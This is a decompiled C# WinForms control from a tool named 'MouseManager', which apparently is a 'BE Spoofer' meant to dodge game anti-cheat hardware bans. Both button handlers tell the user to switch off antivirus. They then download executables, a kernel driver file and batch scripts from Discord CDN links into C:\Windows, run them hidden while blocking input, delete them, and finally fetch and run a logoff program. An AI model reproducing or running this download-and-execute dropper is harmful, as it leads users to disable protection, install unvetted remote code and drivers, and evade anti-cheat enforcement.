using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Siticone.Desktop.UI.WinForms;

namespace MouseManager.UserControls
{
	// Token: 0x02000014 RID: 20
	public class Profile3 : UserControl
	{
		// Token: 0x0600009B RID: 155 RVA: 0x001A865E File Offset: 0x001A105E
		public Profile3()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600009C RID: 156 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void Profile3_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x0600009D RID: 157 RVA: 0x001B351C File Offset: 0x001ABF1C
		private void siticoneButton1_Click(object sender, EventArgs e)
		{
			MessageBox.Show("IF Cleanner FAILS MAKE SHURE U HAVE ALL ANTI VIRUS TURNED OFF !!,Important Message");
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\CleanerFirst.exe";
			string text2 = "C:\\Windows\\CleanerSecond.exe";
			string text3 = "C:\\Windows\\Apex_Cleaner_2.bat";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899048528473624626/CleanerFirst.exe", text);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899048530289766411/CleanerSecond.exe", text2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899049004350971954/Apex_Cleaner_2.bat", text3);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			MessageBox.Show("Spoofer is on, don't touch anything else WAIT !!! .", "Important Message");
			Process.Start(text);
			Thread.Sleep(50000);
			File.Delete(text);
			Process.Start(text2);
			Thread.Sleep(60000);
			Process.Start(text3);
			File.Delete(text2);
			Thread.Sleep(30000);
			File.Delete(text3);
			Thread.Sleep(30000);
			File.Delete(text);
			File.Delete(text2);
			MessageBox.Show("Cleaner worked properlyGOOD GAME", "Important Message");
		}

		// Token: 0x0600009E RID: 158 RVA: 0x001AD874 File Offset: 0x001A6274
		private void siticoneButton4_Click(object sender, EventArgs e)
		{
			if (File.Exists("C:\\Windows\\SPOOFER.exe"))
			{
				File.Delete("C:\\Windows\\SPOOFER.exe");
			}
			if (File.Exists("C:\\Windows\\C.exe"))
			{
				File.Delete("C:\\Windows\\C.exe");
			}
			if (File.Exists("C:\\Windows\\C2.exe"))
			{
				File.Delete("C:\\Windows\\C2.exe");
			}
			if (File.Exists("C:\\Windows\\map.bat"))
			{
				File.Delete("C:\\Windows\\map.bat");
			}
			if (File.Exists("C:\\Windows\\map2.bat"))
			{
				File.Delete("C:\\Windows\\map2.bat");
			}
			if (File.Exists("C:\\Windows\\Mzt5fU.sys"))
			{
				File.Delete("C:\\Windows\\Mzt5fU.sys");
			}
			if (File.Exists("C:\\Windows\\Registry.bat"))
			{
				File.Delete("C:\\Windows\\Registry.bat");
			}
			if (File.Exists("C:\\Windows\\uLLYvMz4ZUeq.sys"))
			{
				File.Delete("C:\\Windows\\uLLYvMz4ZUeq.sys");
			}
			if (File.Exists("C:\\Windows\\User.exe"))
			{
				File.Delete("C:\\Windows\\User.exe");
			}
			if (File.Exists("C:\\Windows\\8hyKnYgs.exe"))
			{
				File.Delete("C:\\Windows\\8hyKnYgs.exe");
			}
			if (File.Exists("C:\\Windows\\Serial_checker.bat"))
			{
				File.Delete("C:\\Windows\\Serial_checker.bat");
			}
			MessageBox.Show("IF SPOOFER FAILS MAKE SHURE U HAVE ALL ANTI VIRUS TURNED OFF !!,Important Message");
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\uLLYvMz4ZUeq.sys";
			string text2 = "C:\\Windows\\User.exe";
			string text3 = "C:\\Windows\\8hyKnYgs.exe";
			string text4 = "C:\\Windows\\Serial_checker.bat";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899006432287023104/Serial_checker.bat", text4);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			MessageBox.Show("Spoofer is on, don't touch anything else WAIT !!! .", "Important Message");
			Profile5.NativeMethods.BlockInput(false);
			Profile5.NativeMethods.BlockInput(true);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899006385344368651/8hyKnYgs.exe", text3);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899006381733052557/uLLYvMz4ZUeq.sys", text);
			Process.Start(text3, text);
			Thread.Sleep(3000);
			File.Delete(text);
			File.Delete(text3);
			Thread.Sleep(5000);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899006383687614494/User.exe", text2);
			Process.Start(text2);
			Thread.Sleep(5000);
			File.Delete(text2);
			File.Delete(text4);
			Profile5.NativeMethods.BlockInput(true);
			Profile5.NativeMethods.BlockInput(false);
			MessageBox.Show("Spoofer worked properly DiskDriver, Volume ID , Nic , SMBIOS , Registry , GPU , CPU.your session will close after the process let it do so !!! .GOOD GAMEImportant Message");
			if (File.Exists("C:\\Windows\\SPOOFER.exe"))
			{
				File.Delete("C:\\Windows\\SPOOFER.exe");
			}
			if (File.Exists("C:\\Windows\\C.exe"))
			{
				File.Delete("C:\\Windows\\C.exe");
			}
			if (File.Exists("C:\\Windows\\C2.exe"))
			{
				File.Delete("C:\\Windows\\C2.exe");
			}
			if (File.Exists("C:\\Windows\\map.bat"))
			{
				File.Delete("C:\\Windows\\map.bat");
			}
			if (File.Exists("C:\\Windows\\map2.bat"))
			{
				File.Delete("C:\\Windows\\map2.bat");
			}
			if (File.Exists("C:\\Windows\\Mzt5fU.sys"))
			{
				File.Delete("C:\\Windows\\Mzt5fU.sys");
			}
			if (File.Exists("C:\\Windows\\Registry.bat"))
			{
				File.Delete("C:\\Windows\\Registry.bat");
			}
			if (File.Exists("C:\\Windows\\uLLYvMz4ZUeq.sys"))
			{
				File.Delete("C:\\Windows\\uLLYvMz4ZUeq.sys");
			}
			if (File.Exists("C:\\Windows\\User.exe"))
			{
				File.Delete("C:\\Windows\\User.exe");
			}
			if (File.Exists("C:\\Windows\\8hyKnYgs.exe"))
			{
				File.Delete("C:\\Windows\\8hyKnYgs.exe");
			}
			if (File.Exists("C:\\Windows\\Serial_checker.bat"))
			{
				File.Delete("C:\\Windows\\Serial_checker.bat");
			}
			string fileName = "C:\\Windows\\logoff.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/901383697176092742/901384332562800650/logoff.exe", fileName);
			Process.Start(fileName);
		}

		// Token: 0x0600009F RID: 159 RVA: 0x001A8672 File Offset: 0x001A1072
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x001B3658 File Offset: 0x001AC058
		private void InitializeComponent()
		{
			this.siticoneHtmlLabel15 = new SiticoneHtmlLabel();
			this.siticoneHtmlLabel13 = new SiticoneHtmlLabel();
			this.siticoneHtmlLabel11 = new SiticoneHtmlLabel();
			this.siticoneHtmlLabel6 = new SiticoneHtmlLabel();
			this.siticoneHtmlLabel14 = new SiticoneHtmlLabel();
			this.siticoneHtmlLabel12 = new SiticoneHtmlLabel();
			this.siticoneHtmlLabel9 = new SiticoneHtmlLabel();
			this.siticoneHtmlLabel7 = new SiticoneHtmlLabel();
			this.siticoneButton1 = new SiticoneButton();
			this.siticoneButton4 = new SiticoneButton();
			this.siticoneHtmlLabel16 = new SiticoneHtmlLabel();
			base.SuspendLayout();
			this.siticoneHtmlLabel15.BackColor = Color.Transparent;
			this.siticoneHtmlLabel15.Enabled = false;
			this.siticoneHtmlLabel15.Font = new Font("Bahnschrift Condensed", 12f);
			this.siticoneHtmlLabel15.ForeColor = Color.White;
			this.siticoneHtmlLabel15.Location = new Point(275, 123);
			this.siticoneHtmlLabel15.Name = "siticoneHtmlLabel15";
			this.siticoneHtmlLabel15.Size = new Size(60, 21);
			this.siticoneHtmlLabel15.TabIndex = 75;
			this.siticoneHtmlLabel15.Text = "Intel / AMD";
			this.siticoneHtmlLabel13.BackColor = Color.Transparent;
			this.siticoneHtmlLabel13.Enabled = false;
			this.siticoneHtmlLabel13.Font = new Font("Bahnschrift Condensed", 12f);
			this.siticoneHtmlLabel13.ForeColor = Color.White;
			this.siticoneHtmlLabel13.Location = new Point(275, 96);
			this.siticoneHtmlLabel13.Name = "siticoneHtmlLabel13";
			this.siticoneHtmlLabel13.Size = new Size(95, 21);
			this.siticoneHtmlLabel13.TabIndex = 74;
			this.siticoneHtmlLabel13.Text = "Any Windows 7-11";
			this.siticoneHtmlLabel11.BackColor = Color.Transparent;
			this.siticoneHtmlLabel11.Enabled = false;
			this.siticoneHtmlLabel11.Font = new Font("Bahnschrift Condensed", 12f);
			this.siticoneHtmlLabel11.ForeColor = Color.White;
			this.siticoneHtmlLabel11.Location = new Point(275, 69);
			this.siticoneHtmlLabel11.Name = "siticoneHtmlLabel11";
			this.siticoneHtmlLabel11.Size = new Size(178, 21);
			this.siticoneHtmlLabel11.TabIndex = 73;
			this.siticoneHtmlLabel11.Text = "All laptops and desktops support.";
			this.siticoneHtmlLabel6.BackColor = Color.Transparent;
			this.siticoneHtmlLabel6.Enabled = false;
			this.siticoneHtmlLabel6.Font = new Font("Bahnschrift Condensed", 12f);
			this.siticoneHtmlLabel6.ForeColor = Color.White;
			this.siticoneHtmlLabel6.Location = new Point(275, 42);
			this.siticoneHtmlLabel6.Name = "siticoneHtmlLabel6";
			this.siticoneHtmlLabel6.Size = new Size(97, 21);
			this.siticoneHtmlLabel6.TabIndex = 71;
			this.siticoneHtmlLabel6.Text = "Not Required Now.";
			this.siticoneHtmlLabel14.BackColor = Color.Transparent;
			this.siticoneHtmlLabel14.Enabled = false;
			this.siticoneHtmlLabel14.Font = new Font("Bahnschrift Condensed", 12f);
			this.siticoneHtmlLabel14.ForeColor = Color.White;
			this.siticoneHtmlLabel14.Location = new Point(143, 42);
			this.siticoneHtmlLabel14.Name = "siticoneHtmlLabel14";
			this.siticoneHtmlLabel14.Size = new Size(103, 21);
			this.siticoneHtmlLabel14.TabIndex = 70;
			this.siticoneHtmlLabel14.Text = "Windows Reinstall:";
			this.siticoneHtmlLabel12.BackColor = Color.Transparent;
			this.siticoneHtmlLabel12.Enabled = false;
			this.siticoneHtmlLabel12.Font = new Font("Bahnschrift Condensed", 12f);
			this.siticoneHtmlLabel12.ForeColor = Color.White;
			this.siticoneHtmlLabel12.Location = new Point(143, 69);
			this.siticoneHtmlLabel12.Name = "siticoneHtmlLabel12";
			this.siticoneHtmlLabel12.Size = new Size(114, 21);
			this.siticoneHtmlLabel12.TabIndex = 69;
			this.siticoneHtmlLabel12.Text = "Supported Hardware:";
			this.siticoneHtmlLabel9.BackColor = Color.Transparent;
			this.siticoneHtmlLabel9.Enabled = false;
			this.siticoneHtmlLabel9.Font = new Font("Bahnschrift Condensed", 12f);
			this.siticoneHtmlLabel9.ForeColor = Color.White;
			this.siticoneHtmlLabel9.Location = new Point(143, 123);
			this.siticoneHtmlLabel9.Name = "siticoneHtmlLabel9";
			this.siticoneHtmlLabel9.Size = new Size(83, 21);
			this.siticoneHtmlLabel9.TabIndex = 67;
			this.siticoneHtmlLabel9.Text = "Supported CPU:";
			this.siticoneHtmlLabel7.BackColor = Color.Transparent;
			this.siticoneHtmlLabel7.Enabled = false;
			this.siticoneHtmlLabel7.Font = new Font("Bahnschrift Condensed", 12f);
			this.siticoneHtmlLabel7.ForeColor = Color.White;
			this.siticoneHtmlLabel7.Location = new Point(143, 96);
			this.siticoneHtmlLabel7.Name = "siticoneHtmlLabel7";
			this.siticoneHtmlLabel7.Size = new Size(76, 21);
			this.siticoneHtmlLabel7.TabIndex = 65;
			this.siticoneHtmlLabel7.Text = "Supported OS:";
			this.siticoneButton1.Animated = true;
			this.siticoneButton1.AutoRoundedCorners = true;
			this.siticoneButton1.BorderColor = Color.White;
			this.siticoneButton1.BorderRadius = 16;
			this.siticoneButton1.BorderThickness = 2;
			this.siticoneButton1.CheckedState.BorderColor = Color.FromArgb(3, 169, 244);
			this.siticoneButton1.CheckedState.FillColor = Color.FromArgb(3, 169, 244);
			this.siticoneButton1.CheckedState.ForeColor = Color.Black;
			this.siticoneButton1.CheckedState.Parent = this.siticoneButton1;
			this.siticoneButton1.Cursor = Cursors.Hand;
			this.siticoneButton1.CustomImages.Parent = this.siticoneButton1;
			this.siticoneButton1.DisabledState.BorderColor = Color.DarkGray;
			this.siticoneButton1.DisabledState.CustomBorderColor = Color.DarkGray;
			this.siticoneButton1.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
			this.siticoneButton1.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
			this.siticoneButton1.DisabledState.Parent = this.siticoneButton1;
			this.siticoneButton1.FillColor = Color.FromArgb(33, 33, 33);
			this.siticoneButton1.Font = new Font("Bahnschrift", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.siticoneButton1.ForeColor = Color.White;
			this.siticoneButton1.HoverState.FillColor = Color.White;
			this.siticoneButton1.HoverState.ForeColor = Color.Black;
			this.siticoneButton1.HoverState.Parent = this.siticoneButton1;
			this.siticoneButton1.Location = new Point(157, 191);
			this.siticoneButton1.Name = "siticoneButton1";
			this.siticoneButton1.ShadowDecoration.Parent = this.siticoneButton1;
			this.siticoneButton1.Size = new Size(247, 35);
			this.siticoneButton1.TabIndex = 64;
			this.siticoneButton1.Text = "Start Cleaner";
			this.siticoneButton1.Click += this.siticoneButton1_Click;
			this.siticoneButton4.Animated = true;
			this.siticoneButton4.AutoRoundedCorners = true;
			this.siticoneButton4.BorderColor = Color.White;
			this.siticoneButton4.BorderRadius = 16;
			this.siticoneButton4.BorderThickness = 2;
			this.siticoneButton4.CheckedState.BorderColor = Color.FromArgb(3, 169, 244);
			this.siticoneButton4.CheckedState.FillColor = Color.FromArgb(3, 169, 244);
			this.siticoneButton4.CheckedState.ForeColor = Color.Black;
			this.siticoneButton4.CheckedState.Parent = this.siticoneButton4;
			this.siticoneButton4.Cursor = Cursors.Hand;
			this.siticoneButton4.CustomImages.Parent = this.siticoneButton4;
			this.siticoneButton4.DisabledState.BorderColor = Color.DarkGray;
			this.siticoneButton4.DisabledState.CustomBorderColor = Color.DarkGray;
			this.siticoneButton4.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
			this.siticoneButton4.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
			this.siticoneButton4.DisabledState.Parent = this.siticoneButton4;
			this.siticoneButton4.FillColor = Color.FromArgb(33, 33, 33);
			this.siticoneButton4.Font = new Font("Bahnschrift", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.siticoneButton4.ForeColor = Color.White;
			this.siticoneButton4.HoverState.FillColor = Color.White;
			this.siticoneButton4.HoverState.ForeColor = Color.Black;
			this.siticoneButton4.HoverState.Parent = this.siticoneButton4;
			this.siticoneButton4.Location = new Point(157, 150);
			this.siticoneButton4.Name = "siticoneButton4";
			this.siticoneButton4.ShadowDecoration.Parent = this.siticoneButton4;
			this.siticoneButton4.Size = new Size(247, 35);
			this.siticoneButton4.TabIndex = 63;
			this.siticoneButton4.Text = "Start Spoof";
			this.siticoneButton4.Click += this.siticoneButton4_Click;
			this.siticoneHtmlLabel16.BackColor = Color.Transparent;
			this.siticoneHtmlLabel16.Enabled = false;
			this.siticoneHtmlLabel16.Font = new Font("Bahnschrift Condensed", 15f);
			this.siticoneHtmlLabel16.ForeColor = Color.White;
			this.siticoneHtmlLabel16.Location = new Point(223, 3);
			this.siticoneHtmlLabel16.Name = "siticoneHtmlLabel16";
			this.siticoneHtmlLabel16.Size = new Size(75, 26);
			this.siticoneHtmlLabel16.TabIndex = 62;
			this.siticoneHtmlLabel16.Text = "BE Spoofer";
			base.AutoScaleDimensions = new SizeF(7f, 17f);
			base.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.FromArgb(33, 33, 33);
			base.Controls.Add(this.siticoneHtmlLabel15);
			base.Controls.Add(this.siticoneHtmlLabel13);
			base.Controls.Add(this.siticoneHtmlLabel11);
			base.Controls.Add(this.siticoneHtmlLabel6);
			base.Controls.Add(this.siticoneHtmlLabel14);
			base.Controls.Add(this.siticoneHtmlLabel12);
			base.Controls.Add(this.siticoneHtmlLabel9);
			base.Controls.Add(this.siticoneHtmlLabel7);
			base.Controls.Add(this.siticoneButton1);
			base.Controls.Add(this.siticoneButton4);
			base.Controls.Add(this.siticoneHtmlLabel16);
			this.Font = new Font("Segoe UI", 10f);
			base.Margin = new Padding(3, 4, 3, 4);
			base.Name = "Profile3";
			base.Size = new Size(554, 484);
			base.Load += this.Profile3_Load;
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000070 RID: 112
		private IContainer components;

		// Token: 0x04000071 RID: 113
		private SiticoneHtmlLabel siticoneHtmlLabel15;

		// Token: 0x04000072 RID: 114
		private SiticoneHtmlLabel siticoneHtmlLabel13;

		// Token: 0x04000073 RID: 115
		private SiticoneHtmlLabel siticoneHtmlLabel11;

		// Token: 0x04000074 RID: 116
		private SiticoneHtmlLabel siticoneHtmlLabel6;

		// Token: 0x04000075 RID: 117
		private SiticoneHtmlLabel siticoneHtmlLabel14;

		// Token: 0x04000076 RID: 118
		private SiticoneHtmlLabel siticoneHtmlLabel12;

		// Token: 0x04000077 RID: 119
		private SiticoneHtmlLabel siticoneHtmlLabel9;

		// Token: 0x04000078 RID: 120
		private SiticoneHtmlLabel siticoneHtmlLabel7;

		// Token: 0x04000079 RID: 121
		private SiticoneButton siticoneButton1;

		// Token: 0x0400007A RID: 122
		private SiticoneButton siticoneButton4;

		// Token: 0x0400007B RID: 123
		private SiticoneHtmlLabel siticoneHtmlLabel16;
	}
}
